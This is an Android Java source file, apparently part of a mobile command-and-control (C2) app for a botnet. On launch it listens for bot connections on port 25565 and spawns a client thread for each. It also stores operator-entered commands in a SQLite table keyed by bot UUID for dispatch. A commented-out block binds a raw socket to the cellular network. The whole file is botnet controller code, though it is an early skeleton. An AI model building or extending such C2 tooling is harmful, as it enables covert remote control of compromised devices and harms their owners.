package c2.mobile.mobilec2;

import androidx.appcompat.app.AppCompatActivity;

import android.content.ContentValues;
import android.database.sqlite.SQLiteDatabase;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;

public class MainActivity extends AppCompatActivity {
    /**
     * Called when the activity is first created.
     */
    private static final String TAG = "ServerSocketTest";
    private ServerSocket server;
    Runnable conn = new Runnable() {
        public void run() {
            try {
                server = new ServerSocket(25565);
                while (true) {
                    Socket socket = server.accept();
                    new C2ClientThread(socket).start();
                }
            } catch (IOException e) {
                Log.e(TAG, e.getMessage());
            } catch (Exception e) {
                Log.e(TAG, e.getMessage());
            }
        }
    };


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        new Thread(conn).start();

        EditText command = (EditText)findViewById(R.id.command);
        Button getCommand = (Button)findViewById(R.id.SendCommand);
        getCommand.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String cmd = command.getText().toString();
                CommandDatabase commandDatabase = new CommandDatabase(getApplicationContext());
                SQLiteDatabase db = commandDatabase.getWritableDatabase();

                // Create a new map of values, where column names are the keys
                ContentValues values = new ContentValues();
                values.put(BotEntryContract.BotEntry.uuid, "test");
                values.put(BotEntryContract.BotEntry.command, cmd);
                values.put(BotEntryContract.BotEntry.output, "");

                // Insert the new row, returning the primary key value of the new row
                long newRowId = db.insert(BotEntryContract.BotEntry.tablename, null, values);
            }
        });


        /*
        Context context = getApplicationContext();
        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(
                Context.CONNECTIVITY_SERVICE);
        NetworkRequest.Builder req = new NetworkRequest.Builder();
        req.addTransportType(NetworkCapabilities.TRANSPORT_CELLULAR);
        cm.requestNetwork(req.build(), new ConnectivityManager.NetworkCallback() {

            @Override
            public void onAvailable(Network network) {
                // If you want to use a raw socket...
                try {
                    Socket socket = new Socket("0.0.0.0", 6969);
                    network.bindSocket(socket);
                    while(true){
                        PrintWriter out = new PrintWriter(new BufferedWriter(new OutputStreamWriter(socket.getOutputStream())), true);
                        BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                    }

                } catch (IOException e) {
                    e.printStackTrace();
                }
            }

            // Be sure to override other options in NetworkCallback() too...

        });

         */


    }
}